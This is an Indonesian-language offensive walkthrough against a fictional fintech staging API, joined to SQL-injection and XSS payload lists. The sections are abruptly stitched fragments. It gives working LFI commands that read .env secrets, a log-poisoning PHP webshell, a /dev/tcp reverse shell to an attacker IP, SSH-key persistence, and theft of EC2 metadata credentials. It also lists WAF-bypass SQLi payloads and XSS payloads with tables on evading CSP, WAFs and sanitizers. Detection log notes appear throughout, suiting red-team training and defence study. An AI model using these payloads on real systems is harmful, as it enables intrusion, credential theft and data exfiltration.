nuclei -u https://api-staging.fintech-example.com -severity critical,high,medium -o nuclei_stage.txt
whatweb -a 3 https://api-staging.fintech-example.com
ffuf -u https://api-staging.fintech-example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,401,403 -fs 0 -o ffuf_api.json
```

**Output yang diharapkan:**
```
whatweb: nginx[1.25.3], PHP[8.2.13], Laravel, Cookies[laravel_session], X-Powered-By[PHP/8.2.13]
ffuf: /_debug/env  [Status: 200, Size: 842]
       /storage/proxies [Status: 200]
       /api/health [Status: 200]
```

Cek header `Server`/`X-Powered-By` (leak) — tidak di-strip di staging:
```bash
curl -sI https://api-staging.fintech-example.com/_debug/env
```
```
HTTP/1.1 200 OK
Server: nginx/1.25.3
X-Powered-By: PHP/8.2.13
Content-Type: text/html; charset=UTF-8
Set-Cookie: laravel_session=...
```

**Artefak log (nginx access.log di host staging):**
```
203.0.113.99 - - [dd/Mon/yyyy:HH:MM:SS +0000] "GET /_debug/env HTTP/1.1" 200 842 "-" "curl/8.5.0"
```
Tanda bahwa route `_debug` tidak diproteksi di staging (`APP_DEBUG=true`, tapi `debug` route buatan internal).

**Kenapa berhasil:** staging deploys dari branch `develop` yang tidak pernah menerima hardening patch (debug route masih ada).

**Gagal jika:** staging di belakang ALB dengan auth Cognito (401 di edge) → semua request mati sebelum nginx.

---

## Step 5 — Debug Parameter → LFI

**Tujuan:** Temukan parameter yang memetakan ke file resolver di Laravel.

Dari `/_debug/env` (response JSON):
```json
{
  "APP_ENV": "staging",
  "APP_DEBUG": "true",
  "LOG_CHANNEL": "stack",
  "VIEW_PATH": "/var/www/app/resources/views",
  "STORAGE_DRIVER": "s3",
  "S3_ENDPOINT": "http://minio-staging.fintech-example.com:9000"
}
```

Nuclei/ffuf menunjukkan endpoint `/_debug/view?file=`. Uji traversal:
```bash
for p in "?file=../.env" "?file=../../etc/passwd" "?file=php://filter/convert.base64-encode/resource=../.env"; do
  curl -s "https://api-staging.fintech-example.com/_debug/view$p" -o out_$(echo $p|md5sum|cut -c1-6).txt
done
```

**Payload yang berhasil (LFI):**
```
GET /_debug/view?file=../../../../var/www/app/.env HTTP/1.1
Host: api-staging.fintech-example.com
```
Response:
```
APP_KEY=base64:[REDACTED]
DB_PASSWORD=[REDACTED]
AWS_ACCESS_KEY_ID=ASIA[REDACTED]
AWS_SECRET_ACCESS_KEY=[REDACTED]
AWS_SESSION_TOKEN=[REDACTED]
```

Dan `php://filter` untuk source disclosure:
```bash
curl -s "https://api-staging.fintech-example.com/_debug/view?file=php://filter/convert.base64-encode/resource=/var/www/app/resources/views/welcome.blade.php" | base64 -d
```

**Artefak log:**
- nginx access.log: `"GET /_debug/view?file=../../../../var/www/app/.env HTTP/1.1" 200`
- Laravel `storage/logs/laravel.log`: `local.ERROR: file_get_contents(../.env): failed to open stream` (jika path salah) → *path brute-force signature*.
- Bila AWS creds ada di `.env`, **CloudTrail** mencatat `GetSecretValue`/`s3:ListBucket` dari role EC2 segera setelah request.

**Kenapa berhasil:** route debug memanggil `file_get_contents($request->input('file'))` tanpa `realpath`/whitelist → blind LFI ke path lokal.

**Gagal jika:** Laravel `debug` route dihapus di production image build, atau PHP `open_basedir` diset ke `storage_path()` → LFI memberi 500.

---

## Step 6 — Log Poisoning → Webshell

**Tujuan:** Konversi LFI (read-only) ke RCE dengan poisoning log yang kemudian di-`include`.

Dari step 5, kita tahu LFI bisa `php://filter`, dan view resolver memakai `include` ketika dipanggil lewat `view` parameter. Kita racuni `laravel.log` dengan PHP payload di User-Agent — log ditulis lengkap ke file.

**Kirim payload:**
```
GET /_debug/view?file=../../../../var/www/app/storage/logs/laravel.log HTTP/1.1
Host: api-staging.fintech-example.com
User-Agent: <?php system($_GET['c']); ?>
X-Forwarded-For: 127.0.0.1
```
Catatan: string `<?php system($_GET['c']); ?>` disimpan ke `laravel.log` sebagai bagian dari access log bila app memakai `request->fullUrl()` di log channel atau saat terjadi error.

Verifikasi poisoning:
```bash
curl -s "https://api-staging.fintech-example.com/_debug/view?file=../../../../var/www/app/storage/logs/laravel.log" | tail -5
```
Harus muncul baris berisi `<?php system($_GET['c']); ?>`.

**Eksekusi:**
```bash
curl -s "https://api-staging.fintech-example.com/_debug/view?file=../../../../var/www/app/storage/logs/laravel.log&c=id"
```
Response (diselipkan di antara teks log):
```
[2024-...] ... "GET /_debug/view ...." "<?php system($_GET['c']); ?>"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Alternatively webshell langsung drop via PHP filter chain (butuh LFI→write):
```bash
curl -s -G "https://api-staging.fintech-example.com/_debug/view" \
  --data-urlencode "file=php://filter/convert.base64-decode/resource=../../../../var/www/app/storage/logs/shell.php" \
  --data-urlencode "data=PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
```
(Data: `<?php system($_GET['c']); ?>` base64.)

**Artefak log (kritis):**
- `laravel.log` membesar 1 blok berisi UA attacker → **indikator `LogInjection`**.
- nginx access.log: UA `<?php system($_GET['c']); ?>` muncul mentah → deteksi `Log4j`-style bukan, tapi rule WAF custom `SecRule REQUEST_HEADERS:User-Agent "@contains <?php"`.
- File save log write mungkin memicu inotify di host (Falco `Write below /var/www`).

**Kenapa berhasil:** log path predictable (`storage/logs/laravel.log`, default Laravel) dan writable oleh `www-data`; LFI meng-include file log → PHP tag dieksekusi.

**Gagal jika:** PHP `allow_url_include=Off` + log di luar `open_basedir`; atau log rotate mid-request (`logrotate` hourly) memotong payload sebelum di-request; atau WAF AWS `AWSManagedRulesKnownBadInputsRuleSet` memblok `<?php`.

---

## Step 7 — Foothold: Persistence & Enumeration

**Tool:** `curl`, `nmap 7.94`, `linpeas.sh` (melalui RCE).

Reverse shell one-liner (lewat parameter `c` untuk menghindari filter):
```bash
curl -s "https://api-staging.fintech-example.com/_debug/view?file=../../../../var/www/app/storage/logs/laravel.log" \
  --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/203.0.113.99/4444 0>&1'"
```
Cross-check versi host via RCE:
```bash
curl -s "https://api-staging.fintech-example.com/_debug/view?file=../../../../var/www/app/storage/logs/laravel.log&c=uname -a;cat /etc/os-release;id"
```
```
Linux ip-10-0-3-44 5.15.0-91-generic #101-Ubuntu SMP ... x86_64 x86_64 GNU/Linux
Ubuntu 22.04.3 LTS
uid=33(www-data) ...
```

Foothold akhir:
```bash
# reverse shell ke 203.0.113.99:4444
nc -lvnp 4444  (attacker)
```
Isi `/home/www-data/.ssh/authorized_keys` untuk persistence (jika writable):
```bash
curl -s ".../laravel.log&c=mkdir -p /home/www-data/.ssh;echo 'ssh-ed25519 AAAA... attacker' >> /home/www-data/.ssh/authorized_keys"
```

**Artefak log:**
- nginx access.log: `"GET /_debug/view?file=...laravel.log&c=bash -c ..."` — akses ke log file dari luar (LFI) → signature `LogFileAccess`.
- Host auth.log: `Accepted publickey for www-data from 203.0.113.99` (jika persistence via SSH dipakai).
- Falco/auditd: `open_by_handle_at` / `execve bash -c bash -i >& /dev/tcp`.

**Kenapa berhasil:** `www-data` punya write ke `storage/logs` dan home default Ubuntu (jika shell dibuat di `/home/www-data`), dan outbound egress ke `203.0.113.99:4444` tidak diblokir di SG staging.

**Gagal jika:** egress filter hanya allow ke range AWS service (port 443 ke `*.amazonaws.com`); atau `www-data` shell `/usr/sbin/nologin` dan tidak ada `python3` → butuh alternatif `socat`/`perl`.

---

## Step 8 — Cloud Metadata (IMDSv1 vs v2)

**Tujuan:** Dari host EC2 staging, ambil credential role instance.

Cek dari reverse shell:
```bash
curl -s -m 2 http://169.254.169.254/latest/meta-data/instance-id
```
Bila respons langsung → **IMDSv1 aktif**:
```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# staged-ec2-minio-role
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/staged-ec2-minio-role
```
Response:
```json
{
  "Code":"Success",
  "AccessKeyId":"ASIA[REDACTED]",
  "SecretAccessKey":"[REDACTED]",
  "Token":"[REDACTED]",
  "Expiration":"2024-01-20T18:33:00Z",
  "Type":"AWS-HMAC"
}
```

Bila IMDSv2 enforced (return `401 Unauthorized` untuk PUT token):
```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Gunakan credential (attacker side):
```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls --endpoint-url http://minio-staging.fintech-example.com:9000
aws s3 ls   # S3 production bucket di account role
```
Output:
```
{
  "UserId":"AROA...:i-0123...",
  "Account":"123456789012",
  "Arn":"arn:aws:sts::123456789012:assumed-role/staged-ec2-minio-role/i-0123..."
}
```
`aws s3 ls` menunjukkan bucket `fintech-prod-transactions`, `fintech-backups`.

**Artefak log (CloudTrail + GuardDuty):**
- CloudTrail event `GetCallerIdentity` dari IP `203.0.113.99` (attacker) dengan role `staged-ec2-minio-role` → **anomali lokasi**.
- GuardDuty finding `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` (karena credential dipakai dari luar VPC / outside AWS).
- VPC Flow Log: koneksi `i-0123 -> 203.0.113.99:443` (STS/S3 API dari luar) — memicu detection rule `role-credential-use-outside-vpc`.
- nginx/php log: `curl http://169.254.169.254/...` tidak muncul di nginx (metadata servis tidak lewat nginx), tapi **auditd execve curl** muncul.

**Kenapa berhasil:** IMDSv1 aktif pada instance staging (mismatch dengan prod yang pakai IMDSv2 `HttpTokens=required`), dan IAM role instance punya izin `s3:*` + `secretsmanager:GetSecretValue` — *over-privileged*.

**Gagal jika:** IMDSv2 required + `HttpPutResponseHopLimit=1` + instance tidak ada di hop proxy → metadata tidak bisa dicapai; atau role dibatasi repository policy ketat (hanya `s3:GetObject` bucket tertentu) → blast radius kecil.

---

## Artefak Log Ringkas (Deteksi)

| Step | Log sumber | Pattern | Signature yang diharapkan terbaca |
|---|---|---|---|
| 1 | ALB access | banyak 404/301 dari 1 ASN | Recon burst |
| 1 | GuardDuty | `Recon:EC2/PortProbeUnprotectedPort` | Wajib ON |
| 2 | CT log (publik) | cert baru `staging.*` | Detection via `crt.sh` diff |
| 3 | CloudFront/niginx | `/_next/static/chunks/*.js` diakses dari IP non-resident | Anomaly UA/BotControl |
| 4 | nginx | `/_debug/env` 200 | Route tidak sepantasnya aktif |
| 5 | laravel.log | `file_get_contents(../...)` gagal | Path traversal error |
| 6 | nginx | UA `<?php` | WAF not present in staging |
| 6 | laravel.log | baris tumbuh berisi tag PHP | LogInjection (Falco rule `PHPTagInLog`) |
| 7 | auth.log | `Accepted publickey for www-data` | Anomali SSH |
| 7 | auditd | `execve` curl 169.254 | Egress ke metadata |
| 8 | CloudTrail | `GetCallerIdentity` dari IP non-AWS | Credential exfil |
| 8 | GuardDuty | `InstanceCredentialExfiltration.OutsideAWS` | Wajib ON + SNS |

---

## Jebakan Operasional (yang membuat walkthrough ini gagal di lapangan)

1. **IMDSv2 mixed-mode**: instance staging sering "hampir" IMDSv2 tapi `HttpPutResponseHopLimit=2` di ASG lama → PUT /token jalan, tapi token tidak diterima di hop proxy. Cek `curl -v` untuk status 401 berulang.
2. **Log rotation mid-request**: `logrotate` yang `copytruncate` tiap jam memotong payload di `laravel.log` antara poison dan include → LFI 500. Solusi: re-poison tepat setelah rotation (`stat` mtime).
3. **`open_basedir`** PHP 8.2 di staging dari default `php-fpm` Ubuntu (`/var/www/app:...`): path traversal ../../ ditolak tanpa error jelas (warning di log, 500 di response). Periksa `.env`/`php.ini` dari LFI kalau `APP_DEBUG` off.
4. **WAF managed rules on staging**: `AWSManagedRulesKnownBadInputsRuleSet` memblok `<?php` di UA dan `../` di query string pada path `_debug`. Jika terblokir, sambungkan via `php://filter` base64 (tidak match rule) — tapi harga RCE butuh LFI write, yang sering dimatikan (`allow_url_include=Off`, `allow_url_fopen` tidak relevan untuk filter).
5. **Recycled AMI**: instance staging dibangun dari AMI 2 tahun lalu, role instance `prod-*` (bukan `staged-*`) karena Terraform copy → blast radius lebih besar dari yang diasumsikan; ini bukan bug tapi justru *jebakan bagi defender* — pastikan `role` di-assign via ASG launch template dan di-scope per env.
6. **CT exclusion**: gunakan `crt.sh` dengan exclusion `-exclude expired` untuk menghindari ratusan subdomain lama mati (DNS `NXDOMAIN` → `httpx` timeout → walkthrough macet).
7. **`X-Forwarded-For` stripping**: kalau ALB `xff-header-processing-mode=remove`, payload di header tidak tersimpan di log — implementasikan poison via query string (Lebih noisy tapi lebih pasti).
8. **MinIO endpoint internal-only**: `minio-staging.fintech-example.com:9000` hanya resolve dari dalam VPC → curl dari internet mati `NXDOMAIN`; harus tunnel via reverse shell di step 7/8 untuk memakai endpoint ini.
9. **CloudTrail data events off**: `s3:ListBucket` tidak akan muncul di CloudTrail kecuali data events diaktifkan — banyak defender salah menyimpulkan "tidak ada eksfiltrasi" karena *data events* tidak pihak. Enable `s3:GetObject`/`ListBucket` data events untuk bucket production.
10. **TLS pinning di admin SPA**: `admin-staging` sering punya HPKP/pinning ke Cloudflare — `curl` biasa 403. Gunakan browser headless (Chrome 131) dengan `--ignore-certificate-errors` hanya jika target *tidak* memverifikasi; jika pinning aktif, JS mining step 3 harus lewat bundle, bukan DOM instrumentation.
11. **Rate limit 429**: `ffuf` dengan `-rate 5` aman; tanpa `-rate` akan 429 di nginx `limit_req` staging (default `1r/s burst 5`) → semua hasil palsu `403`. Cek `nginx.conf` dari LFI bila memungkinkan.
12. **Laravel `key:generate` rotation**: kalau `APP_KEY` dirotasi setelah `.env` bocor (defender sigap), JWT/session lama invalid — webshell via log poisoning tetap jalan, tapi token yang sudah dicuri di step 3 mati. Jangan bergantung pada token untuk persistence.


```sql
-- PostgreSQL 14+ | sukses: "invalid input syntax" / cast error memuat data
```


```sql
-- Oracle 19c | sukses: ORA-01722 / ORA-06502 memuat data
' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))-- -
' AND 1=ctxsys.drithsx.sn(1,(SELECT user FROM dual))-- -
' AND 1=1/(SELECT 1 FROM (SELECT 1 FROM dual WHERE (SELECT count(*) FROM all_tables)>0))-- -
```

## 6. WAF-Bypass Encoding

```sql
-- Hex encoding (MySQL/MSSQL) | 'root' -> 0x726f6f74
' UNION SELECT 0x726f6f74,2,3-- -
' AND 0x726f6f74=user()-- -
'/**/UNION/**/SELECT/**/1,2,3-- -
```

```sql
-- Comment bypass
'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3-- -
' UN/*x*/ION SEL/*y*/ECT 1,2,3-- -
' UNION/**/ALL/**/SELECT/**/1,2,3-- -
' OR/**/1=1-- -
'--%0aUNION%0aSELECT%0a1,2,3
```

```sql
-- Case / keyword scramble
' UnIoN SeLeCt 1,2,3-- -
' uNiOn aLl sElEcT 1,2,3-- -
' AND 1=1 OrDeR BY 2-- -
' UNION ALL SELECT 1,2,3-- -
'%27%20UNION%20SELECT%201,2,3--%20
```

```sql
-- Unicode / fullwidth
' ＵＮＩＯＮ ＳＥＬＥＣＴ 1,2,3-- -
' %C0%A7%20OR%201=1-- -
' UNION%a0SELECT%a01,2,3-- -
' UNION SELECT 1,2,3%23
```

```sql
-- Whitespace bypass
'UNION(SELECT(1),(2),(3))-- -
'UNION%0ASELECT%0A1,2,3-- -
'UNION%09SELECT%091,2,3-- -
'OR 1=1%0A--%20
'AND(SELECT 1 FROM(SELECT 1)a)--%20
```

```sql
-- Parenthesis / operator bypass
'||'1'='1
' OR 1 LIKE 1-- -
' OR 'a'='a'-- -
' AND 1 BETWEEN 1 AND 1-- -
' OR 1 REGEXP 1-- -
' OR '1' IN ('1')-- -
```

```sql
-- Hex URL-encoded (request-level)
%27%20UNION%20SELECT%201%2C2%2C3--%20
%27%20AND%20SLEEP%285%29--%20
%27%20OR%201=1--%20
```

```sql
-- MySQL CHARSET trick
' UNION SELECT 'a', 'b', 'c' COLLATE utf8mb4_general_ci-- -
' UNION SELECT 1, 'a' COLLATE utf8mb4_0900_ai_ci, 3-- -
```

## Jebakan Operasional yang Bikin Teknik Ini Gagal di Lapangan

| # | Jebakan | Gejala | Mitigasi |
|---|---------|--------|----------|
| 1 | Parameterized/prepared statement aktif (PDO emulate=false, JDBC `?`, Hibernate HQL) | payload literal masuk sebagai string, tidak dieksekusi | uji reflektif (`'` ganda jadi `''`), cari injeksi di identifier/column name |
| 2 | WAF modern menormalisasi hex `0x..` menjadi string | `0x726f6f74` dirender literal bukan `'root'` | ganti konkat `CHR()` per byte atau guna `CHAR()` |
| 3 | `mysqli` non-multi-query: `; WAITFOR` / `; INSERT` ignored | time-blind MSSQL gagal padahal semantik valid | pakai `IF(...) WAITFOR DELAY` dalam satu statement |
| 4 | MySQL `sql_mode=ONLY_FULL_GROUP_BY` + `STRICT_TRANS_TABLES` | payload `GROUP BY rand()` di blokir, duplicate-entry error mati | fallback `extractvalue`/`updatexml`, atau time-based |
| 5 | PostgreSQL `standard_conforming_strings=on` | `'` backslash escape tidak berlaku | ganti ke klausa `CHR(39)` atau hex `E'\\x..'` |
| 6 | Oracle `ALL_TAB_COLUMNS` privasi + `SELECT` dari `V$VERSION` butuh grant | error-based blank, `SYS.DBMS_*` unauthorized | pakai `ctxsys.drithsx` atau `utl_inaddr` sesuai role |
| 7 | SQLite tanpa fungsi `randomblob` besar / `SET` mati | time-blind alternatif tidak ada | pakai error-based `CAST` murni |
| 8 | ModSecurity CRS 4.x rule 942100–942200 memblokir inline comment `/**/` | `403` / `406` saat payload dikirim | rotate ke Unicode fullwidth atau case scramble per request |
| 9 | Cloudflare/Akamai normalisasi whitespace UTF-8 (`%a0`) | `UNION(SELECT...)` crash parser | kirim whitespace alternatif `%0c`, `%0d`, atau kurung tanpa spasi |
| 10 | `sqlmap` default `--risk=1` tidak menembak `ORDER BY` payload lebih dari 10 | column count >10 gagal | manual `ORDER BY 1..N` inkremental, atau `--level=5` |
| 11 | DBMS connection charset mismatch (mis. latin1 vs utf8mb4 di MySQL 8.0) | output hex ter-mangle, `LOAD_FILE` gagal | tambahkan `COLLATE` atau `CONVERT(... USING utf8mb4)` |
| 12 | Redis/ElastiCache fronting SQL (proxy menyaring `SLEEP`) | time-based respons konstan 200ms | ganti `BENCHMARK` (MySQL) atau `pg_sleep` dengan `generate_series` CPU burn |
| 13 | `sqlmap` `--time-sec` default 5, target rate-limit 429 di CDN | false positive time-based | `--time-sec=10 --delay=1 --retries=1` |
| 14 | Stored procedure wrapper (MyBatis `#{}` vs `${}`) | `${}` = injectable, `#{}` bukan | grep mapper XML untuk `${` di query string |


## w2-payload-xss-corps

# w2-payload-xss-corps — web

# Korpus Payload XSS — Referensi Internal Red Team

## 1. HTML Body (Context: `<div>INJECT</div>`)

| # | Payload | Vektor | Catatan |
|---|---|---|---|
| 1 | `<script>alert(1)</script>` | Klasik | Gagal jika CSP `script-src 'self'` tanpa `unsafe-inline` |
| 2 | `<img src=x onerror=alert(1)>` | Attribute event | Chrome 131: eksekusi sebelum load gagal; render blocking |
| 3 | `<svg onload=alert(1)>` | SVG event | Butuh namespace HTML; gagal di dalam `<table>` tanpa `<svg>` wrapping |
| 4 | `<iframe srcdoc="<script>alert(1)</script>">` | srcdoc | Bypass beberapa sanitizer yang hanya strip `src` |
| 5 | `<details open ontoggle=alert(1)>` | Toggle event | Auto-fire saat `open`; reliable di Chrome 131 / Firefox 133 |
| 6 | `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>` | mXSS (DOMPurify <2.4.0) | Mutation XSS; gagal di DOMPurify ≥3.0.0 |
| 7 | `<video><source onerror=alert(1)>` | Media error | Fire saat source invalid |
| 8 | `<body onload=alert(1)>` | Body event | Hanya jika injeksi di root; gagal di fragment |
| 9 | `<input autofocus onfocus=alert(1)>` | Autofocus | Chrome 131: fire saat elemen di-DOM; gagal di `display:none` |
| 10 | `<marquee onstart=alert(1)>` | Deprecated tag | Masih fire di Chrome 131 |

| Varian | Payload | Mekanisme |
|---|---|---|
| Uppercase | `<IMG SRC=x ONERROR=alert(1)>` | Filter case-sensitive; HTML parser case-insensitive |
| Mixed case tag | `<ScRiPt>alert(1)</ScRiPt>` | Sama seperti di atas |

| Obfuscation alert (hex) | `<img src=x onerror="\u0061lert(1)">` | JS unicode escape di string eval |
| JSFuck ringkas | `<img src=x onerror="[][(![]+[])[+[]]+...](1)">` | Full JSFuck ~6KB; ringkas: `top['al'+'ert'](1)` |
| Unicode tag (U+E0000 block) | `<img src=x onerror=alert(1)>` | Variasi tag chars; Chrome 131 abaikan di identifier, filter regex miss |

## 10. Jebakan Operasional (Field Failures)

| # | Jebakan | Gejala | Mitigasi |
|---|---|---|---|
| 1 | **CSP `script-src 'self'`** | Payload terkirim, tidak fire; console `Refused to execute inline script` | Cari endpoint tanpa CSP header; cek `Content-Security-Policy-Report-Only`; eksploit via JSONP whitelist |
| 2 | **`X-Content-Type-Options: nosniff` + `Content-Type: text/plain`** | Reflected payload tidak di-parse | Cari reflection di `text/html`; polyglot content-type |
| 3 | **Chrome 131 Trusted Types** | `require-trusted-types-for 'script'` blok `innerHTML` | Cari sink non-TT (`srcdoc` kadang lolos; `eval` diblok) |
| 4 | **Reflection di dalam `<textarea>` / `<title>`** | Tag di-escape, tidak parse | Cek closing `</textarea>` dulu; payload break-out `</textarea><script>` |
| 5 | **DOMPurify ≥3.0.0** | mXSS #6 gagal | Cek versi via fingerprint `DOMPurify.version`; cari endpoint tanpa sanitizer |
| 6 | **`HttpOnly` + `Secure` cookie** | `alert(1)` fire tapi tidak bisa exfil session | Fokus ke CSRF token theft / keylogger / form grab |
| 7 | **Reflection di JSON response** | Payload terlihat di DevTools tapi tidak render | Cek `Content-Type: application/json`; butuh endpoint yang reflect ke HTML |
| 8 | **`X-Frame-Options: DENY` / `frame-ancestors`** | iframe-based payload gagal | Bukan blocker XSS langsung; cari sink lain |
| 9 | **WAF signature `alert(`** | 403 pada payload klasik | Pakai `top['al'+'ert'](1)`, `confirm(1)`, `prompt(1)`, `print()` |
| 10 | **WAF persen-encoding** | Payload ter-encode diteruskan mentah ke HTML | Double-encode `%253C...`; cek decode order (server vs browser) |
| 11 | **Server escape `'` → `\'` dan `"` → `\"`** | Break-out quote gagal | Injeksi backslash dulu: `\';alert(1)//` |
| 12 | **HTML entity encode semua `<>&"'`** | Semua payload mati | Cari reflection di konteks lain (JS string, CSS, URL) |
| 13 | **Reflection di `href` dengan `target=_blank`** | `javascript:` tidak fire | Cek `rel=noopener`; cari navigasi same-tab |
